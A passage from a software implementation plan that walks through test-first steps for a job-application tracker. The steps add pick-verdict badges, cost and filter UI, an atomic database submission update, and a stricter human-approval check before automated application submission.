      <ApplicationDetailSheet application={{ ...baseApplication, pick_verdict: null }} onClose={() => {}} />
    );
    expect(screen.getByText("Not yet scored.")).toBeInTheDocument();
  });

  it("renders cost fields when present", async () => {
    const withCost = {
      ...baseApplication,
      resume_cost_usd: 0.42,
      resume_tokens_input: 1000,
      resume_tokens_output: 500,
    };
    render(<ApplicationDetailSheet application={withCost} onClose={() => {}} />);
    expect(screen.getByText(/0\.4200/)).toBeInTheDocument();
    expect(screen.getByText(/1000/)).toBeInTheDocument();
    expect(screen.getByText(/500/)).toBeInTheDocument();
  });

  it("omits the cost section entirely when all cost fields are null", async () => {
    render(<ApplicationDetailSheet application={baseApplication} onClose={() => {}} />);
    expect(screen.queryByText("Cost")).not.toBeInTheDocument();
  });
});
```

- [ ] **Step 6: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationDetailSheet.test.tsx`
Expected: FAIL — no pick or cost section exists yet.

- [ ] **Step 7: Implement — add the pick and cost sections to `ApplicationDetailSheet.tsx`**

Add imports:

```tsx
import { Badge } from "@/components/ui/Badge";
import { pickVerdictVariant } from "@/lib/applicationBadges";
```

Add two new `<section>` blocks inside `SheetBody`'s flex column, after the "Application preview" section added in Task 4:

```tsx
                <section>
                  <h3 className="text-sm font-medium text-fg mb-2">Pick</h3>
                  {application.pick_verdict ? (
                    <div className="flex flex-col gap-2">
                      <Badge variant={pickVerdictVariant(application.pick_verdict)}>
                        {application.pick_verdict}
                      </Badge>
                      {application.pick_score !== null && (
                        <p className="text-sm text-fg-muted">Score: {application.pick_score}</p>
                      )}
                      {application.pick_reasoning && (
                        <p className="text-sm text-fg-muted whitespace-pre-wrap">
                          {application.pick_reasoning}
                        </p>
                      )}
                    </div>
                  ) : (
                    <p className="text-fg-dim text-sm">Not yet scored.</p>
                  )}
                </section>

                {(application.resume_cost_usd !== null ||
                  application.resume_tokens_input !== null ||
                  application.resume_tokens_output !== null) && (
                  <section>
                    <h3 className="text-sm font-medium text-fg mb-2">Cost</h3>
                    <div className="flex flex-col gap-1 text-sm text-fg-muted">
                      {application.resume_cost_usd !== null && (
                        <p>Cost: ${application.resume_cost_usd.toFixed(4)}</p>
                      )}
                      {application.resume_tokens_input !== null && (
                        <p>Input tokens: {application.resume_tokens_input}</p>
                      )}
                      {application.resume_tokens_output !== null && (
                        <p>Output tokens: {application.resume_tokens_output}</p>
                      )}
                    </div>
                  </section>
                )}
```

- [ ] **Step 8: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationDetailSheet.test.tsx`
Expected: all tests PASS.

- [ ] **Step 9: Write the failing test for the table's badge color (U9 in `ApplicationsPage.tsx`)**

`contact-manager/src/components/ApplicationsPage.test.tsx` — add inside `describe("ApplicationsPage -- pipeline visibility", ...)`, after the existing `"shows a pick-verdict badge for a scored row"` test:

```tsx
  it("colors the pick-verdict badge by verdict", async () => {
    render(<ApplicationsPage />);
    const cell = await screen.findByText("LangChain");
    const row = cell.closest("tr") as HTMLElement;
    const badge = within(row).getByText("strong");
    expect(badge.className).toContain("emerald");
  });
```

- [ ] **Step 10: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: FAIL — the table's `<Badge>{app.pick_verdict}</Badge>` has no `variant` prop, so it renders with the `default` variant's classes, which don't contain `"emerald"`.

- [ ] **Step 11: Implement — apply the variant in `ApplicationsPage.tsx`**

Add `import { pickVerdictVariant } from "@/lib/applicationBadges";` to the imports. Change:

```tsx
                <td className="py-2 pr-4">
                  {app.pick_verdict ? <Badge>{app.pick_verdict}</Badge> : <span className="text-fg-dim">—</span>}
                </td>
```

to:

```tsx
                <td className="py-2 pr-4">
                  {app.pick_verdict ? (
                    <Badge variant={pickVerdictVariant(app.pick_verdict)}>{app.pick_verdict}</Badge>
                  ) : (
                    <span className="text-fg-dim">—</span>
                  )}
                </td>
```

- [ ] **Step 12: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: all tests PASS.

- [ ] **Step 13: Run the full vitest suite**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm test`
Expected: 0 failures.

- [ ] **Step 14: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add contact-manager/src/lib/applicationBadges.ts contact-manager/src/lib/applicationBadges.test.ts contact-manager/src/components/ui/Badge.tsx contact-manager/src/components/ApplicationDetailSheet.tsx contact-manager/src/components/ApplicationDetailSheet.test.tsx contact-manager/src/components/ApplicationsPage.tsx contact-manager/src/components/ApplicationsPage.test.tsx && git commit -m "$(cat <<'EOF'
feat(applications): pick/cost sections and verdict badge colors (U6/U9/U15)

New lib/applicationBadges.ts::pickVerdictVariant maps strong/maybe/no to
Badge's existing emerald/amber/red variants -- reused in both the table
(U9) and the new detail-sheet Pick section (U6, full score + reasoning,
no truncation). Cost section (U15) renders resume_cost_usd/
resume_tokens_input/resume_tokens_output when any are non-null; no
backend change needed, these columns already existed and were already
populated by resume_agent.py.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 6: Filters (U7/U12), `source_channel` write + display, `applied_date` fix (U8)

**Files:**
- Modify: `db.py`
- Modify: `apply_agent.py`
- Modify: `tests/test_apply_agent.py`
- Modify: `contact-manager/src/app/api/applications/route.ts`
- Modify: `contact-manager/src/app/api/applications/route.test.ts`
- Modify: `contact-manager/src/components/ApplicationsPage.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.test.tsx`

**Interfaces:**
- Produces: `db.record_submission(application_id, source_channel, applied_date)` — a new, single-atomic-update accessor. `GET /api/applications` accepts `?source=`. `ApplicationsPage.tsx` gains `stageFilter`/`sourceFilter` state and re-fetches on change. Also extends `apply_agent.py`'s `submit()` guard (C4) to require `job.get("approved_at")` truthy in addition to its existing `stage`/`apply_preview` checks — closing the gap where nothing in the system actually read the `approved_at` column Task 1 added, leaving the manual `workflow_dispatch` path to `apply_agent_submit.yml` able to bypass the ARMED gate entirely. `db.get_job_application`'s existing `select("*")` already returns `approved_at`, so no `db.py` change is needed for the read side.

Distinct `source=` values confirmed live via `grep -rn 'source="' cu_linkedin.py job_discovery.py jobright.py` plus `POST /api/applications`'s own `"manual"` default: `linkedin`, `ats_scan`, `jobright`, `manual`.

- [ ] **Step 1: Write the failing Python test for `db.record_submission` + the atomic write in `submit()`**

`tests/test_apply_agent.py` — replace the existing `test_submit_clicks_submit_and_flips_stage_when_armed` test:

```python
def test_submit_clicks_submit_and_flips_stage_when_armed(mocker):
    mocker.patch.dict(os.environ, {"APPLY_AGENT_ARMED": "1"})
    mocker.patch("apply_agent.db.get_job_application", return_value={
        "id": 1, "company": "Acme", "role": "PM", "job_url": "https://boards.greenhouse.io/embed/job_app?token=1",
        "resume_file_ref": "resumes/1/r.pdf", "cover_letter_file_ref": "resumes/1/cl.pdf",
        "stage": "ready_to_submit", "apply_preview": {"platform": "greenhouse"},
        "approved_at": "2026-09-20T00:00:00Z",
    })
    mocker.patch("apply_agent.ats_platform.classify", return_value="greenhouse")
    page = MagicMock()
    mocker.patch("apply_agent._launch_page", return_value=page)
    mocker.patch("apply_agent.ats_fillers.fill_greenhouse")
    mocker.patch("apply_agent._attach_resume_and_cover_letter")
    mocker.patch("apply_agent._submission_confirmed", return_value=True)
    fake_date = mocker.patch("apply_agent.date")
    fake_date.today.return_value.isoformat.return_value = "2026-09-24"
    record_submission_mock = mocker.patch("apply_agent.db.record_submission")
    mocker.patch("apply_agent.db.set_apply_preview")

    apply_agent.submit(1)

    page.get_by_role.assert_called_with("button", name=apply_agent._SUBMIT_BUTTON_NAME)
    page.get_by_role.return_value.click.assert_called_once()
    record_submission_mock.assert_called_once_with(1, "greenhouse", "2026-09-24")
```

(`"approved_at": "2026-09-20T00:00:00Z"` is added to this fixture because of C4 below — once
`submit()`'s guard also requires `approved_at` truthy, this row must carry one to reach the
stage-flip line at all; without it this test would now raise at the guard instead of clicking
Submit.)

**C1/I4/C4 — required edits to FIVE other pre-existing tests in this same file, not shown
above.** These are NOT "remain unmodified" cases — an earlier draft of this plan's parenthetical
here was WRONG, and undercounted besides (it named two tests; the guard's real position in
`apply_agent.py` — checked at the very top of `submit()`, at line 383, before the ARMED check
at line 416, before platform classification, before everything else — means every test whose
row is expected to get past that check needs a real edit once Step 4b lands the `approved_at`
guard extension and Step 4's `db.record_submission` swap). Confirmed against the live file
(`apply_agent.py:363-417`, `tests/test_apply_agent.py:406-580`):

- **`test_submit_fills_screening_and_eligibility_from_the_stored_preview_not_regenerated`**
  (`tests/test_apply_agent.py:477-507`) — armed, `_submission_confirmed=True`, reaches the
  stage-flip line today. Patches only `apply_agent.db.update_job_application_stage` (line 500,
  unused by any assertion — harmless to leave, but see `db.record_submission` below). Once Step
  4 replaces the call site with `db.record_submission(...)`, this falls through to the real
  `db.get_client()`, hits a fake URL, `_retry` sleeps ~6s (2s+4s backoff), then re-raises.
  **Fix:** add `mocker.patch("apply_agent.db.record_submission")`, and add `"approved_at":
  "2026-09-20T00:00:00Z"` to its `get_job_application` fixture (currently `{"id": 1, "company":
  "Acme", "role": "PM", "job_url": "...", "stage": "ready_to_submit", "apply_preview":
  stored_preview}` — no `approved_at` key at all).

- **`test_submit_does_not_click_submit_when_not_armed`** (lines 406-425) — **an earlier draft of
  this plan claimed this test needs no `approved_at` fixture change "because the not-armed check
  runs first." That is FALSE against the real file** — the guard at line 383 runs
  unconditionally, before the ARMED check at line 416; this test's fixture already has
  `stage="ready_to_submit"` and a truthy `apply_preview` specifically so it clears that guard
  and reaches the ARMED check. Without `approved_at`, `submit(1)` now raises `ValueError`
  (uncaught — this test has no `pytest.raises`), and the test errors out. **Fix:** add
  `"approved_at": "2026-09-20T00:00:00Z"` to this test's `get_job_application` fixture. Also
  (I4) rename the patched/asserted target from `db.update_job_application_stage` to
  `db.record_submission`, since after Step 4 `submit()` never calls
  `update_job_application_stage` on any path — asserting it proves nothing.

- **`test_submit_raises_and_leaves_stage_unchanged_when_confirmation_is_missing`** (lines
  451-474) — armed, reaches `_submission_confirmed=False`. Its fixture already clears
  `stage`/`apply_preview` (no `approved_at`). **Fix:** add `"approved_at":
  "2026-09-20T00:00:00Z"` to the fixture — without it this test now raises for the wrong reason
  (the guard, not the missing-confirmation `RuntimeError` its own docstring says it exists to
  catch — a real incident reported via external PR review of PR #8). Also (I4) rename the
  patched/asserted target from `db.update_job_application_stage` to `db.record_submission`, for
  the same "proves nothing once nothing calls it" reason as above.

- **`test_submit_never_arms_from_a_missing_or_falsy_env_value`** (lines 509-531) — **not
  identified in an earlier draft of this plan at all.** Loops over 7 non-`"1"` `APPLY_AGENT_ARMED`
  values; its single `get_job_application` fixture (shared across every loop iteration) has
  `stage="ready_to_submit"` and a truthy `apply_preview`, no `approved_at`, and no
  `pytest.raises` around the call — same failure mode as
  `test_submit_does_not_click_submit_when_not_armed`. **Fix:** add `"approved_at":
  "2026-09-20T00:00:00Z"` to the fixture dict inside the loop. (Its `update_stage_mock` patch
  target does not need renaming for I4's reasoning to hold up — this test was not one of the two
  the review named — but leaving it patching `update_job_application_stage` is harmless either
  way since neither function is ever called on this test's not-armed path.)

- **`test_submit_raises_on_permanently_excluded_platform`** (lines 534-553, parametrized over
  `["workday", "aggregator"]`) — **not identified in an earlier draft of this plan at all.**
  This test's own comment states the intent explicitly: *"Must be an otherwise-approved row, or
  the approval guard (which runs first) would raise instead and this would pass without
  exercising the platform guard at all."* Its fixture already has `stage="ready_to_submit"` and
  a truthy `apply_preview` for exactly this reason, with no `approved_at`. Without it, `submit()`
  now raises `ValueError(match="unapproved row")` instead of reaching the platform-exclusion
  check at line 390-391 — the test's `pytest.raises(ValueError, match="permanently-excluded")`
  then fails because the actual raised message doesn't match. **Fix:** add `"approved_at":
  "2026-09-20T00:00:00Z"` to the fixture.

`test_submit_raises_on_unapproved_row`'s three existing `@pytest.mark.parametrize` cases (bad
stage / already applied / missing preview) and `test_submit_raises_on_nonexistent_row` need no
fixture change — each already fails at an earlier condition (the `stage`/`apply_preview` checks,
or the `not job` check before the guard even runs) regardless of `approved_at`. See C4's new
fourth parametrize case for `test_submit_raises_on_unapproved_row` below.

- [ ] **Step 2: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest tests/test_apply_agent.py::test_submit_clicks_submit_and_flips_stage_when_armed -v`
Expected: FAIL — `apply_agent.date` doesn't exist as a patchable name yet (no `from datetime import date` in `apply_agent.py`), and `apply_agent.db.record_submission` doesn't exist on `db.py` yet.

- [ ] **Step 2b: Run the five other edited tests, verify they fail for the expected reason**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest tests/test_apply_agent.py -v -k "fills_screening_and_eligibility or does_not_click_submit_when_not_armed or confirmation_is_missing or never_arms_from_a_missing_or_falsy_env_value or permanently_excluded_platform"`
Expected: `test_submit_fills_screening_and_eligibility_from_the_stored_preview_not_regenerated`
FAILs (`apply_agent.db.record_submission` doesn't exist on `db.py` yet, same root cause as Step
2). The other four — `test_submit_does_not_click_submit_when_not_armed`,
`test_submit_raises_and_leaves_stage_unchanged_when_confirmation_is_missing`,
`test_submit_never_arms_from_a_missing_or_falsy_env_value`, and
`test_submit_raises_on_permanently_excluded_platform` — currently still PASS at this point (the
`approved_at` fixture additions and the two patch-target renames don't change observable
behavior until Step 4b's guard extension actually lands). That's expected; Step 4b below is what
exercises the new guard behavior for all five.

- [ ] **Step 3: Implement — add `db.record_submission`**

In `db.py`, add immediately after `update_job_application_stage`:

```python
def record_submission(application_id, source_channel, applied_date):
    """Atomically flip a row to 'applied' and record how/when it was actually filed. Must be
    ONE update, not stage-then-fields separately -- a partial failure between two calls would
    leave the row applied with no source_channel/applied_date, or vice versa."""
    result = _retry(lambda: get_client().table("job_applications")
                     .update({"stage": "applied", "source_channel": source_channel,
                              "applied_date": applied_date, "updated_at": datetime.utcnow().isoformat()})
                     .eq("id", application_id).execute())
    return result.data[0] if result.data else None
```

- [ ] **Step 4: Implement — use it in `apply_agent.py`'s `submit()`**

Add `from datetime import date` to the top imports of `apply_agent.py` (alongside `json`, `logging`, `re`). Change:

```python
        db.update_job_application_stage(job_id, "applied")
```

to:

```python
        db.record_submission(job_id, platform, date.today().isoformat())
```

- [ ] **Step 4b: Extend `submit()`'s guard to also require `approved_at` (C4)**

The real guard in `apply_agent.py` (confirmed live, lines 379-387) is the first thing `submit()`
checks after confirming the row exists — before the ARMED check, before platform classification,
before `_launch_page`:

```python
    # The ARMED gate proves a human tapped *something*; this proves they approved *this row*.
    # Without it, any id reaching the workflow gets submitted -- a stale id, a mistyped manual
    # workflow_dispatch, or a row that was never previewed (no eligibility answers, no screening
    # answers, possibly no resume) would go to a real employer.
    if job.get("stage") != "ready_to_submit" or not job.get("apply_preview"):
        raise ValueError(
            f"submit() called on an unapproved row: id={job_id} | stage={job.get('stage')} | "
            f"has_preview={bool(job.get('apply_preview'))}"
        )
```

Nothing anywhere in the system actually reads `approved_at` (added in Task 1) — worse, the
GitHub Actions workflow this plan's submit route dispatches to is `workflow_dispatch`-triggerable
manually with any `application_id`, which is exactly the bypass `approved_at` was meant to close.
Change it to:

```python
    # The ARMED gate proves a human tapped *something*; this proves they approved *this row*.
    # Without it, any id reaching the workflow gets submitted -- a stale id, a mistyped manual
    # workflow_dispatch, or a row that was never previewed (no eligibility answers, no screening
    # answers, possibly no resume) would go to a real employer. approved_at (Task 1) closes the
    # last gap: it can only ever be set via the approve_application RPC, which a human actually
    # tapping "Approve & Submit" in the UI triggers -- so this is the one condition here that
    # can't be satisfied by a stale id or a mistyped manual workflow_dispatch alone.
    if (
        job.get("stage") != "ready_to_submit"
        or not job.get("apply_preview")
        or not job.get("approved_at")
    ):
        raise ValueError(
            f"submit() called on an unapproved row: id={job_id} | stage={job.get('stage')} | "
            f"has_preview={bool(job.get('apply_preview'))} | "
            f"approved={bool(job.get('approved_at'))}"
        )
```

Kept as `ValueError` with the same `match="unapproved row"` prefix the existing
`test_submit_raises_on_unapproved_row` regex already checks for — no need to change that test's
`pytest.raises(ValueError, match="unapproved row")` calls, only its parametrize list (below).

`db.get_job_application`'s existing `select("*")` already returns `approved_at` — confirmed, no
`db.py` change needed for the read side.

**Extend `test_submit_raises_on_unapproved_row`'s `@pytest.mark.parametrize`** (confirmed live,
`tests/test_apply_agent.py:558-565`) with a fourth case. Current list:

```python
@pytest.mark.parametrize("job,reason", [
    ({"id": 1, "company": "Acme", "role": "PM", "job_url": "https://boards.greenhouse.io/x",
      "stage": "saved", "apply_preview": {"platform": "greenhouse"}}, "never previewed"),
    ({"id": 1, "company": "Acme", "role": "PM", "job_url": "https://boards.greenhouse.io/x",
      "stage": "applied", "apply_preview": {"platform": "greenhouse"}}, "already submitted"),
    ({"id": 1, "company": "Acme", "role": "PM", "job_url": "https://boards.greenhouse.io/x",
      "stage": "ready_to_submit", "apply_preview": None}, "no preview blob"),
])
```

Add a fourth tuple, in the same style, immediately after the third:

```python
    ({"id": 1, "company": "Acme", "role": "PM", "job_url": "https://boards.greenhouse.io/x",
      "stage": "ready_to_submit", "apply_preview": {"platform": "greenhouse"},
      "approved_at": None}, "not yet approved"),
```

This is the case that actually proves the new condition does something — the three existing
cases (bad stage, already applied, missing preview) all fail on the `stage`/`apply_preview`
checks and don't exercise `approved_at` at all; without this fourth case, C4's guard extension
could be silently deleted and every existing test in this file would keep passing.

- [ ] **Step 5: Run the tests, verify they pass**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest tests/test_apply_agent.py -v`
Expected: all tests in the file PASS — the rewritten test, the five C1/I4/C4-edited tests from
Step 1/2b (each now carrying an `approved_at` fixture value, two with a renamed patch target),
the new fourth `test_submit_raises_on_unapproved_row` parametrize case, and every
otherwise-unmodified test.

- [ ] **Step 6: Run the full Python suite**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent && pytest -q`
Expected: 0 failures.

- [ ] **Step 7: Write the failing test for the `?source=` filter on the GET route**

`contact-manager/src/app/api/applications/route.test.ts` — find this file's existing mock chain
setup (it currently has `mockEq.mockReturnValue({ order: mockOrder })`, which cannot express two
chained `.eq()` calls on the same query builder). **Fix (M4):** change it to
`mockEq.mockReturnValue({ order: mockOrder, eq: mockEq })` so a second `.eq(...)` in the same
chain returns the same mock and stays chainable — the route's `load()` can request
`?stage=X&source=Y` together once this task's `?source=` support lands, and the existing shape
can't represent that.

Add inside `describe("GET /api/applications", ...)`, after the existing `"filters by stage query param"` test:

```ts
  it("filters by source query param", async () => {
    await GET(new Request("http://test/api/applications?source=linkedin"));
    expect(mockEq).toHaveBeenCalledWith("source", "linkedin");
  });

  it("filters by both stage and source query params together (M4)", async () => {
    await GET(new Request("http://test/api/applications?stage=applied&source=linkedin"));
    expect(mockEq).toHaveBeenCalledWith("stage", "applied");
    expect(mockEq).toHaveBeenCalledWith("source", "linkedin");
  });
```

- [ ] **Step 8: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/route.test.ts`
Expected: FAIL — the route ignores `?source=` entirely today, so both new tests fail (the
combined-filter test fails regardless of the mock-chain fix, since `source` support doesn't
exist yet either way).

- [ ] **Step 9: Implement — add `?source=` support to `route.ts`**

In `contact-manager/src/app/api/applications/route.ts`, change:

```ts
export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const stage = searchParams.get("stage");
  try {
    const supabase = getClient();
    let query = supabase.from("job_applications").select("*");
    if (stage) query = query.eq("stage", stage);
    const { data, error } = await query.order("created_at", { ascending: false });
```

to:

```ts
export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const stage = searchParams.get("stage");
  const source = searchParams.get("source");
  try {
    const supabase = getClient();
    let query = supabase.from("job_applications").select("*");
    if (stage) query = query.eq("stage", stage);
    if (source) query = query.eq("source", source);
    const { data, error } = await query.order("created_at", { ascending: false });
```

- [ ] **Step 10: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/route.test.ts`
Expected: all tests PASS.

- [ ] **Step 11: Write the failing tests for the frontend filters and the source/source_channel columns**

`contact-manager/src/components/ApplicationsPage.test.tsx` — add the shared, per-instance-scoped `@radix-ui/react-select` mock (needed because this page renders many concurrent `Select`s — one per row plus two filters — so a single shared `_onValueChange` variable, as used in `ContactsFilters.test.tsx`, would route a click to the wrong instance; this mock instead threads `onValueChange` through React context, one per `<Select>` instance). Add this block right after the existing `vaul` mock:

```tsx
vi.mock("@radix-ui/react-select", async () => {
  const actual = await vi.importActual<typeof import("react")>("react");
  const SelectCtx = actual.createContext<{ onValueChange?: (v: string) => void }>({});
  return {
    Root: ({
      children,
      value,
      onValueChange,
    }: {
      children: React.ReactNode;
      value?: string;
      onValueChange?: (v: string) => void;
    }) => (
      <SelectCtx.Provider value={{ onValueChange }}>
        <div data-select-value={value}>{children}</div>
      </SelectCtx.Provider>
    ),
    Trigger: ({ children }: { children: React.ReactNode }) => <button type="button">{children}</button>,
    Value: () => null,
    Icon: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Portal: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Content: ({ children }: { children: React.ReactNode }) => <div>{children}</div>,
    Viewport: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Group: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Label: ({ children }: { children: React.ReactNode }) => <div>{children}</div>,
    Item: ({ children, value }: { children: React.ReactNode; value: string }) => {
      const ctx = actual.useContext(SelectCtx);
      return (
        <div role="option" data-value={value} onClick={() => ctx.onValueChange?.(value)}>
          {children}
        </div>
      );
    },
    ItemText: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    ItemIndicator: () => null,
    Separator: () => <hr />,
  };
});
```

Update the `readyApplication` fixture (from Task 3's rewrite) to include `source_channel: "ashby"` — it already does per Task 3's Step 9. Add a new `describe` block at the end of the file:

```tsx
describe("ApplicationsPage -- filters and source columns (U7/U8/U12)", () => {
  it("renders both the source and filed-via columns", async () => {
    render(<ApplicationsPage />);
    const cell = await screen.findByText("Ashby Co");
    const row = cell.closest("tr") as HTMLElement;
    expect(within(row).getByText("jobright")).toBeInTheDocument();
    expect(within(row).getByText("ashby")).toBeInTheDocument();
  });

  it("refetches with the stage filter applied", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Acme");
    const filter = screen.getByTestId("stage-filter");
    await waitFor(() => {
      expect(within(filter).getAllByRole("option").length).toBeGreaterThan(0);
    });
    (global.fetch as ReturnType<typeof vi.fn>).mockClear();
    const option = within(filter).getByRole("option", { name: "Applied" });
    await user.click(option);
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith("/api/applications?stage=applied");
    });
  });

  it("refetches with the source filter applied", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Acme");
    const filter = screen.getByTestId("source-filter");
    const option = within(filter).getByRole("option", { name: "linkedin" });
    (global.fetch as ReturnType<typeof vi.fn>).mockClear();
    await user.click(option);
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith("/api/applications?source=linkedin");
    });
  });
});
```

- [ ] **Step 12: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: FAIL — no filter controls, no `Source`/`Filed via` columns exist yet.

- [ ] **Step 13: Implement — filters and columns in `ApplicationsPage.tsx`**

Add a module-level constant right after the imports:

```tsx
const SOURCE_OPTIONS = ["linkedin", "ats_scan", "jobright", "manual"] as const;
```

Add filter state and rewrite `load` to accept filter args, right after the `selectedApplication` state:

```tsx
  const [stageFilter, setStageFilter] = useState<string>("__all__");
  const [sourceFilter, setSourceFilter] = useState<string>("__all__");

  const load = async (stage: string = stageFilter, source: string = sourceFilter) => {
    setLoading(true);
    try {
      const params = new URLSearchParams();
      if (stage !== "__all__") params.set("stage", stage);
      if (source !== "__all__") params.set("source", source);
      const qs = params.toString();
      const res = await fetch(`/api/applications${qs ? `?${qs}` : ""}`);
      const data = await res.json();
      setApplications(data.applications ?? []);
    } catch {
      toast.error("Could not load applications");
    } finally {
      setLoading(false);
    }
  };
```

Remove the old bodyless `const load = async () => { ... }` this replaces (same name, this is its full replacement). Add two handlers right after `load`'s definition and before `useEffect`:

```tsx
  const handleStageFilterChange = (v: string) => {
    setStageFilter(v);
    load(v, sourceFilter);
  };

  const handleSourceFilterChange = (v: string) => {
    setSourceFilter(v);
    load(stageFilter, v);
  };
```

Add the filter UI right after the closing `</form>` and before the `{loading ? ... }` block:

```tsx
      <div className="flex gap-3">
        <label data-testid="stage-filter" className="flex flex-col gap-1 text-sm text-fg-muted">
          Stage
          <Select value={stageFilter} onValueChange={handleStageFilterChange}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="__all__">All stages</SelectItem>
              {JOB_APPLICATION_STAGES.map((s) => (
                <SelectItem key={s} value={s}>
                  {JOB_APPLICATION_STAGE_LABELS[s]}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </label>
        <label data-testid="source-filter" className="flex flex-col gap-1 text-sm text-fg-muted">
          Source
          <Select value={sourceFilter} onValueChange={handleSourceFilterChange}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="__all__">All sources</SelectItem>
              {SOURCE_OPTIONS.map((s) => (
                <SelectItem key={s} value={s}>
                  {s}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </label>
      </div>
```

Add two new table columns. In `<thead>`, change:

```tsx
              <th className="py-2 pr-4">Blocked</th>
              <th className="py-2 pr-4">Preview / Submit</th>
```

to:

```tsx
              <th className="py-2 pr-4">Blocked</th>
              <th className="py-2 pr-4">Source</th>
              <th className="py-2 pr-4">Filed via</th>
              <th className="py-2 pr-4">Preview / Submit</th>
```

In `<tbody>`, change:

```tsx
                <td className="py-2 pr-4 text-fg-dim">
                  {app.apply_blocked_reason ?? "—"}
                </td>
```

to:

```tsx
                <td className="py-2 pr-4 text-fg-dim">
                  {app.apply_blocked_reason ?? "—"}
                </td>
                <td className="py-2 pr-4 text-fg-dim">{app.source ?? "—"}</td>
                <td className="py-2 pr-4 text-fg-dim">{app.source_channel ?? "—"}</td>
```

- [ ] **Step 14: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: all tests PASS.

- [ ] **Step 15: Run the full vitest suite and typecheck**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm test && npx tsc --noEmit`
Expected: 0 failures, no type errors.

- [ ] **Step 15b: Document in `docs/python/db-schema.md` (M16)**

Add an entry for the new `db.record_submission(application_id, source_channel, applied_date)`
function (one atomic update: `stage='applied'` + `source_channel` + `applied_date`) and note
that `apply_agent.py`'s `submit()` now also requires `approved_at` truthy (C4). Keep this file
current in the same task that lands the change, per this repo's root `CLAUDE.md`.

- [ ] **Step 16: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add db.py apply_agent.py tests/test_apply_agent.py contact-manager/src/app/api/applications/route.ts contact-manager/src/app/api/applications/route.test.ts contact-manager/src/components/ApplicationsPage.tsx contact-manager/src/components/ApplicationsPage.test.tsx docs/python/db-schema.md && git commit -m "$(cat <<'EOF'
feat(applications): stage/source filters, source_channel write, applied_date fix (U7/U8/U12)

New db.record_submission(application_id, source_channel, applied_date)
is one atomic update (stage='applied' + source_channel + applied_date)
called from apply_agent.py's submit() in place of the old bare
update_job_application_stage(job_id, "applied") call -- closes two real
gaps at once: source_channel was never written anywhere, and
applied_date was never set on a successful submit either.

submit()'s guard (the first thing it checks, before even the ARMED
check) now also requires approved_at truthy -- Task 1's column,
previously unread by anything -- closing the gap where the manual
workflow_dispatch path to apply_agent_submit.yml could bypass the ARMED
gate entirely. Five pre-existing tests needed an approved_at fixture
value added to keep reaching the code path each one actually tests,
since all five already relied on clearing stage/apply_preview to get
past this same guard: the armed-and-confirmed test, the
missing-confirmation regression test, the not-armed test, the
never-arms-from-a-falsy-env-value test, and the permanently-excluded-
platform test -- the last two were not identified by an earlier draft
of this plan at all, and the guard extension would have silently broken
both with no test catching it. One of the five also needed a new
db.record_submission mock it didn't have (it would otherwise hang for
~6s hitting a real db.get_client() call and fail); two had their
patched target renamed from the now-dead update_job_application_stage
to record_submission, since nothing calls the old function on any path
anymore and asserting it proves nothing.

Frontend: stage/source <Select> filters re-fetch GET /api/applications
with the active query params; new Source/Filed via table columns
distinguish where a job was discovered (source) from how it was
actually filed (source_channel).

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 7: `ConfirmModal` + status polling wired into `ApplicationsPage.tsx` (U4/U5 frontend)

**Files:**
- Modify: `contact-manager/src/components/ApplicationsPage.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.test.tsx`
- Modify: `contact-manager/tests/e2e/18-applications.spec.ts`
- Modify: `contact-manager/src/app/api/applications/[id]/route.ts`
- Modify: `contact-manager/src/app/api/applications/[id]/route.test.ts`
- Create: `contact-manager/src/app/api/applications/[id]/reset-approval/route.ts`
